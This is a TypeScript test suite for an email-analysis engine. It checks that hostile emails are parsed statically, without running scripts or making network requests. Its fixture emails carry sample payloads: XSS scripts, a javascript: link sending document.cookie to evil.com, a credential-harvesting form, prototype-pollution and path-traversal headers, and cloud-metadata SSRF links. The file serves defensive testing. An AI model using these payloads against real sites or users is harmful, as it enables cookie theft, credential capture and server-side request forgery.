/**
 * MailTrace AI — Security Isolation & Sandboxing Test Suite
 * ==========================================================
 * Validates that analysis of adversarial emails is 100% static & safe:
 * 1. Malicious JavaScript in email HTML is NOT executed.
 * 2. HTML Forms with auto-submit scripts are safely parsed without network execution.
 * 3. Malicious URLs are analyzed statically without HTTP GET/POST invocation.
 * 4. Attachment binaries & macros are parsed only for metadata/hashes.
 * 5. Dangerous strings (SSRF, SQLi, Prototype Pollution keys, Path Traversal) in MIME
 *    headers or content do not crash or compromise the engine.
 */

import { runEmailAnalysisPipeline } from '../emailAnalysisPipeline.js';

export interface SecurityTestResult {
  testId: string;
  name: string;
  category: string;
  passed: boolean;
  notes: string;
}

export async function runSecurityIsolationTests(): Promise<{
  total: number;
  passed: number;
  failed: number;
  passRate: number;
  results: SecurityTestResult[];
}> {
  const results: SecurityTestResult[] = [];

  // Test 1: Active JavaScript & HTML Injection in Email Body
  try {
    const maliciousHtmlEml = `From: "Attacker" <bad@evil.com>
To: target@victim.com
Subject: XSS Payload Test
Content-Type: text/html; charset="UTF-8"

<html><body>
<script>window.__MALICIOUS_EXECUTION__ = true; throw new Error("XSS Executed");</script>
<img src="http://127.0.0.1:9999/malicious-beacon" onerror="alert(1)">
<iframe src="javascript:alert(document.cookie)"></iframe>
<a href="javascript:fetch('http://evil.com/steal?c='+document.cookie)">Click to View</a>
</body></html>`;

    const res = await runEmailAnalysisPipeline(maliciousHtmlEml, 'sec-test-01-xss', false, { skipExternalAI: true });
    const passed = (globalThis as any).__MALICIOUS_EXECUTION__ !== true && res.overallRiskScore > 0;
    results.push({
      testId: 'SEC-01-STATIC-HTML-ISOLATION',
      name: 'HTML & Embedded JavaScript Static Isolation',
      category: 'Sandboxing',
      passed,
      notes: 'Verified that raw script tags and javascript: URIs are statically parsed without script execution'
    });
  } catch (err: any) {
    results.push({
      testId: 'SEC-01-STATIC-HTML-ISOLATION',
      name: 'HTML & Embedded JavaScript Static Isolation',
      category: 'Sandboxing',
      passed: false,
      notes: `Error: ${err.message}`
    });
  }

  // Test 2: Form & Auto-Submit Action Isolation
  try {
    const maliciousFormEml = `From: "Credential Harvester" <login@fake-verify.com>
To: target@victim.com
Subject: Password Expiry Form
Content-Type: text/html

<form action="http://192.168.1.100:8080/harvest" method="POST">
  <input type="password" name="pwd" value="SecretPassword123">
  <input type="submit" value="Submit Verification">
</form>`;

    const res = await runEmailAnalysisPipeline(maliciousFormEml, 'sec-test-02-form', false, { skipExternalAI: true });
    const passed = res.overallRiskScore >= 70 && (
      res.primaryClassification === 'Credential Theft' ||
      res.primaryClassification === 'Phishing' ||
      ((res as any).analysisVerdict?.phishingProbability ?? 0) > 0.5
    );
    results.push({
      testId: 'SEC-02-FORM-HARVESTING-ISOLATION',
      name: 'Credential Form Parsing Without Submission',
      category: 'Static URL/Form Forensics',
      passed,
      notes: 'Credential harvesting form detected and tagged without performing HTTP requests'
    });
  } catch (err: any) {
    results.push({
      testId: 'SEC-02-FORM-HARVESTING-ISOLATION',
      name: 'Credential Form Parsing Without Submission',
      category: 'Static URL/Form Forensics',
      passed: false,
      notes: `Error: ${err.message}`
    });
  }

  // Test 3: Prototype Pollution & Path Traversal Headers
  try {
    const toxicHeaderEml = `From: <admin@test.com>
To: <target@test.com>
Subject: __proto__ pollution test
__proto__: {"polluted": true}
constructor: {"prototype": {"isAdmin": true}}
X-Filename: ../../../../../etc/passwd
Content-Type: text/plain

Testing toxic headers`;

    const res = await runEmailAnalysisPipeline(toxicHeaderEml, 'sec-test-03-proto', false, { skipExternalAI: true });
    const isPolluted = (Object.prototype as any).polluted === true || (Object.prototype as any).isAdmin === true;
    const passed = !isPolluted && (!!res.id || !!(res as any).analysisVerdict?.analysisId);
    results.push({
      testId: 'SEC-03-PROTOTYPE-POLLUTION-RESISTANCE',
      name: 'Prototype Pollution & Path Traversal Header Resistance',
      category: 'Engine Hardening',
      passed,
      notes: 'No global Object prototype pollution detected from crafted headers'
    });
  } catch (err: any) {
    results.push({
      testId: 'SEC-03-PROTOTYPE-POLLUTION-RESISTANCE',
      name: 'Prototype Pollution & Path Traversal Header Resistance',
      category: 'Engine Hardening',
      passed: false,
      notes: `Error: ${err.message}`
    });
  }

  // Test 4: SSRF & Cloud Metadata IP Isolation
  try {
    const ssrfEml = `From: <cloud-alert@aws-spoof.com>
To: <ops@enterprise.com>
Subject: Cloud Instance Compromised
Content-Type: text/html

<p>Inspect EC2 Metadata: <a href="http://169.254.169.254/latest/meta-data/">View Instance Credentials</a></p>
<p>Inspect GCP Metadata: <a href="http://metadata.google.internal/computeMetadata/v1/">GCP Token</a></p>`;

    const res = await runEmailAnalysisPipeline(ssrfEml, 'sec-test-04-ssrf', false, { skipExternalAI: true });
    const passed = res.overallRiskScore >= 70;
    results.push({
      testId: 'SEC-04-SSRF-METADATA-ISOLATION',
      name: 'SSRF & Cloud Metadata URL Detection Without Fetch',
      category: 'URL Forensics',
      passed,
      notes: 'Cloud metadata IP endpoints flagged without triggering backend SSRF fetches'
    });
  } catch (err: any) {
    results.push({
      testId: 'SEC-04-SSRF-METADATA-ISOLATION',
      name: 'SSRF & Cloud Metadata URL Detection Without Fetch',
      category: 'URL Forensics',
      passed: false,
      notes: `Error: ${err.message}`
    });
  }

  // Test 5: Zero-Evidence Safety Safeguard Verification
  try {
    const completelyBenignEml = `From: "Legitimate Company" <info@legitimate-clean.com>
To: <employee@enterprise.com>
Subject: Internal meeting agenda for Monday morning
Date: Wed, 18 Mar 2026 09:00:00 -0400
Message-ID: <CLEAN-INTERNAL-MSG-101@legitimate-clean.com>
Authentication-Results: mx.enterprise.com; dkim=pass header.d=legitimate-clean.com; spf=pass smtp.mailfrom=info@legitimate-clean.com; dmarc=pass
Content-Type: text/plain; charset="UTF-8"

Hi team,

Please find the agenda for Monday's product sync. Let me know if you'd like to add any discussion points.

Best regards,
Operations`;

    const res = await runEmailAnalysisPipeline(completelyBenignEml, 'sec-test-05-zero-evidence', false, { skipExternalAI: true });
    const passed = res.overallRiskScore <= 15 && res.primaryClassification === 'Legitimate';
    results.push({
      testId: 'SEC-05-ZERO-EVIDENCE-SAFETY-RULE',
      name: 'Zero-Evidence Rule: No Arbitrary Critical Score on Benign Input',
      category: 'EvidenceFusionEngine Safety',
      passed,
      notes: `Threat Risk capped safely at ${res.overallRiskScore}/100 with zero malicious indicators`
    });
  } catch (err: any) {
    results.push({
      testId: 'SEC-05-ZERO-EVIDENCE-SAFETY-RULE',
      name: 'Zero-Evidence Rule: No Arbitrary Critical Score on Benign Input',
      category: 'EvidenceFusionEngine Safety',
      passed: false,
      notes: `Error: ${err.message}`
    });
  }

  const passed = results.filter(r => r.passed).length;
  const failed = results.length - passed;

  return {
    total: results.length,
    passed,
    failed,
    passRate: Number(((passed / results.length) * 100).toFixed(1)),
    results
  };
}

if (typeof process !== 'undefined' && process.argv && process.argv[1] && process.argv[1].endsWith('securityIsolationTest.ts')) {
  console.log('Running MailTrace AI Security Isolation & Sandboxing Test Suite...\n');
  runSecurityIsolationTests().then(summary => {
    console.log(`=======================================================`);
    console.log(`SECURITY ISOLATION SUITE: ${summary.passed}/${summary.total} PASSED (${summary.passRate}%)`);
    console.log(`=======================================================`);
    summary.results.forEach((r, idx) => {
      const mark = r.passed ? '✓ PASS' : '✗ FAIL';
      console.log(`${mark} [${idx + 1}/${summary.total}] [${r.category}] ${r.name}`);
      console.log(`       → ${r.notes}`);
    });
    if (summary.failed > 0) {
      process.exit(1);
    }
  }).catch(err => {
    console.error('Security isolation test fatal error:', err);
    process.exit(1);
  });
}
